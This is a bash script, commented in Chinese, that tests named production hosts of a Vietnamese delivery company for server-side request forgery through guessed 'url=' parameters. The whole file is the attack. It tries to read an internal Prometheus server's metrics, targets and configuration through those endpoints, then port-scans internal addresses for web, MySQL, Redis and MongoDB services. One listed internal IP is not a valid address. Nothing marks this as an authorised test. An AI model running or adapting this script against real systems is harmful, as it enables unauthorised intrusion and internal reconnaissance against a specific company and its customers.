#!/bin/bash

PROMETHEUS="http://10.110.28.141:9090"

# 可能存在SSRF的系统和参数
SSRF_TARGETS=(
    "admin.giaohangtietkiem.vn|/api/fetch?url="
    "admin.giaohangtietkiem.vn|/api/proxy?url="
    "admin.giaohangtietkiem.vn|/api/image?url="
    "dashboard.ghtk.vn|/api/fetch?url="
    "dashboard.ghtk.vn|/api/image?url="
    "dashboard.ghtk.vn|/api/screenshot?url="
    "inter.ghtk.vn|/api/proxy?url="
    "inter.ghtk.vn|/api/callback?url="
    "hrm-api.ghtk.vn|/api/webhook?url="
    "sos.ghtk.vn|/api/fetch?url="
)

echo "[*] 测试SSRF访问Prometheus监控系统..."
echo ""

for target_param in "${SSRF_TARGETS[@]}"; do
    target=$(echo $target_param | cut -d'|' -f1)
    param=$(echo $target_param | cut -d'|' -f2)
    
    echo "━━━ 测试: $target ━━━"
    
    # 测试1: /metrics
    echo -n "  [1] $param${PROMETHEUS}/metrics → "
    resp=$(curl -sk "https://${target}${param}${PROMETHEUS}/metrics" -m 3 2>&1)
    if echo "$resp" | grep -qE "# HELP|# TYPE|prometheus"; then
        echo "✅ SSRF成功！Prometheus Metrics可访问！"
        echo "$resp" | head -30
        echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    else
        echo "❌"
    fi
    
    # 测试2: /api/v1/targets
    echo -n "  [2] $param${PROMETHEUS}/api/v1/targets → "
    resp=$(curl -sk "https://${target}${param}${PROMETHEUS}/api/v1/targets" -m 3 2>&1)
    if echo "$resp" | grep -qE "\"status\":\"success\"|targets"; then
        echo "✅ SSRF成功！所有监控目标可见！"
        echo "$resp" | jq . 2>/dev/null | head -50
        echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    else
        echo "❌"
    fi
    
    # 测试3: /config
    echo -n "  [3] $param${PROMETHEUS}/config → "
    resp=$(curl -sk "https://${target}${param}${PROMETHEUS}/config" -m 3 2>&1)
    if echo "$resp" | grep -qE "global:|scrape_configs:"; then
        echo "✅ SSRF成功！Prometheus配置文件泄露！"
        echo "$resp" | head -50
        echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    else
        echo "❌"
    fi
    
    echo ""
done

echo ""
echo "[*] 测试其他内网IP..."
for internal_ip in "10.63.2.15" "10.63.398.302"; do
    echo "━━━ 内网IP: $internal_ip ━━━"
    for port in 80 443 8080 3306 6379 27017; do
        echo -n "  Port $port → "
        resp=$(curl -sk "https://admin.giaohangtietkiem.vn/api/proxy?url=http://${internal_ip}:${port}" -m 2 2>&1)
        [ -n "$resp" ] && echo "⚠️  有响应！" || echo "❌"
    done
done

